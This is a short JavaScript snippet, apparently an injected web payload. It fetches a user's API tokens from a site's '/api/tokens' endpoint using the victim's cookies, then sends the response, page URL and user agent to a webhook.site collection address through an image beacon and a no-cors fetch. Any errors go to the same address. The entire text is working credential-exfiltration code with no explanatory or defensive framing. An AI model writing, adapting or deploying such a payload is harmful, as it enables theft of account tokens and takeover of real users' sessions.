fetch("/api/tokens/691e4e20744d5e6d95f51f40", {
  method: "GET",
  credentials: "include"
})
.then(r => r.json())
.then(data => {
  console.log("[+] API data received:", data);

  const payload = {
    data,
    url: location.href,
    ua: navigator.userAgent
  };

  const exfilUrl = "https://webhook.site/03f59b91-ca5f-415e-ab63-e552fd7e6674?data=" + encodeURIComponent(JSON.stringify(payload));

  console.log("[+] Exfiltrating to:", exfilUrl);

  // Use both image and fetch
  const img = new Image();
  img.src = exfilUrl;

  fetch(exfilUrl, { mode: "no-cors" });
})
.catch(err => {
  const errorUrl = "https://webhook.site/03f59b91-ca5f-415e-ab63-e552fd7e6674?error=" + encodeURIComponent(err.message);
  new Image().src = errorUrl;
});
